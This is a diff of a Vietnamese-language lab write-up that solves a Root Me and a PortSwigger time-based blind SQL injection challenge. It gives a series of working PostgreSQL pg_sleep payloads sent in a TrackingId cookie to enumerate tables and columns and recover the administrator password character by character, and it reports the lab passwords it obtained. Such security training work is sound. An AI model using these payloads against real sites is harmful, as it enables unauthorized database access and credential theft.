@@ -1,6 +1,10 @@
 # Trần Mạnh Huy - Task3
 
-* [1. SQL injection - Time based](1-sql-injection---time-based)
+* [1. Root me - SQL injection - Time based](1--root-me---sql-injection---time-based)
+* [2. Portswigger: Blind SQL injection with time delays and information retrieval](2-portswigger-blind-sql-injection-with-time-delays-and-information-retrieval)
+
+
+## 1. Root me - SQL injection - Time based
 
 Vừa vào ta có giao diện:
 
@@ -16,7 +20,7 @@ Nhấn vào admin với url: **http://challenge01.root-me.org/web-serveur/ch40/?
 
 Xác định được rồi giờ ta sẽ đi tìm tên bảng, tên cột và thông tin cần, cụ thể ở đây sẽ là tìm được administrator password với dạng payload chung:
 
-> 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+> SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
 
 ![image](https://user-images.githubusercontent.com/104350480/221472507-a9b47bc2-01e9-4b72-88ed-6e8226cd219e.png)
 
@@ -119,5 +123,70 @@ Ta chuyển đổi về dạng char về text thì được : T!m3B@s3DSQL!
 ![image](https://user-images.githubusercontent.com/104350480/221502624-cc8a2c17-34f9-489b-89e8-dca18b04de81.png)
 
 Ta cũng có được password: T!m3B@s3DSQL!
+
+## 2. Portswigger: Blind SQL injection with time delays and information retrieval
+
+Bài này thì ý tưởng vẫn tương tự bài trên, ta sẽ đi bruteforece từng cái một, đầu tiên là table_name là users, tiếp đến là column_name là username và password
+Sau khi có được username = 'administrator' ta sẽ tìm password tương ứng. Ở đây sẽ lần lượt dùng burpsuite, script và cả sqlmap để giải quyết bài này.
+
+Đầu tiên như trên ta làm lần lượt với burpsuite trước. Bài này cũng giống như các bài blind trước, ta tiêm vào phần TrackingId
+Trước hết là thực hiện test sleep() xem thuộc dạng nào thì bài này thử với pg_sleep() nó hoạt động nên dbs là postgresql
+
+> Cookie: TrackingId=z8gpmSjNfugquqLX'%3bselect+pg_sleep(10)+--
+
+Test điều kiện: 
+
+> Cookie: TrackingId=z8gpmSjNfugquqLX'%3bselect+case+when(1=1)+then+pg_sleep(10)+else+pg_sleep(0)+end+--
+
+Kiểm tra độ dài của table_name hàng 1:
+
+> Cookie: TrackingId=z8gpmSjNfugquqLX'%3bselect+case+when((select+length(table_name)+from+information_schema.tables+limit+1)>1)+then+pg_sleep(10)+else+pg_sleep(0)+end+--
+
+Ta tìm ra được độ dài là: 5. Tiếp tục sử dụng substring() để tìm kiếm từng kí tự: 
+
+> Cookie: TrackingId=z8gpmSjNfugquqLX'%3bselect+case+when(substring((select+table_name+from+information_schema.tables+limit+1),1,1)>'a')+then+pg_sleep(10)+else+pg_sleep(0)+end+--
+
+![image](https://user-images.githubusercontent.com/104350480/221527342-9d218404-92a6-4dcc-9319-0957e55723fa.png)
+
+Cho vào burp intruder,ta được bảng có tên là users. Tiếp tục payload tìm kiếm cột. Vì bài này chẳng filter gì nên ta cứ thế làm như bình thường:
+
+> Cookie: TrackingId=z8gpmSjNfugquqLX'%3bselect+case+when((select+length(column_name)+from+information_schema.columns+where+table_name='users'+limit+1)>1)+then+pg_sleep(10)+else+pg_sleep(0)+end+--
+
+Ta tìm được độ dài của cột 1 là 8, substring tương tự như trên ta được cột thứ 1 là username
+
+![image](https://user-images.githubusercontent.com/104350480/221529276-eba9d382-1844-4bd0-b70f-efc8666fbe7f.png)
+
+Tương tự ta tìm được cột 2 cũng là 8 bằng cách thêm offset 1 ở sau limit 1, substring tương tự ta được cột thứ 2 là password: 
+
+![image](https://user-images.githubusercontent.com/104350480/221529730-4ab64162-55b9-4aea-acf0-efb4678ecb64.png)
+
+Khi ta có được 2 cột là username và password ta sẽ kiếm xem ở đâu có username là 'administrator'. Ta có payload: 
+
+> Cookie: TrackingId=z8gpmSjNfugquqLX'%3bselect+case+when((select+length(username)+from+users+limit+1)>1)+then+pg_sleep(10)+else+pg_sleep(0)+end+--
+
+Ta tìm được độ dài là 13, substring ra được luôn tên là administrator. 
+
+> Cookie: TrackingId=z8gpmSjNfugquqLX'%3bselect+case+when(substring((select+username+from+users+limit+1),§1§,1)='§a§')+then+pg_sleep(10)+else+pg_sleep(0)+end+-- 
+
+![image](https://user-images.githubusercontent.com/104350480/221531115-d36ce016-f34e-415b-94ea-92ef7ab3f836.png)
+
+Giờ tìm nốt password tương ứng: 
+
+> Cookie: TrackingId=z8gpmSjNfugquqLX'%3bselect+case+when((select+length(password)+from+users+where+username='administrator')>1)+then+pg_sleep(10)+else+pg_sleep(0)+end+--
+
+Ta tìm được độ dài của password là 20. Tiếp tục cho vào burp intruder với substring để tìm từng kí tự ta được: 
+
+![image](https://user-images.githubusercontent.com/104350480/221532407-ba867c88-b865-4a0e-9744-abe3c9b603ee.png)
+
+> Vậy password của administrator trong bài lab là: aon10t6tnj02e4sfpb7u
+
+
+
+
+
+
+
+
+
 
 
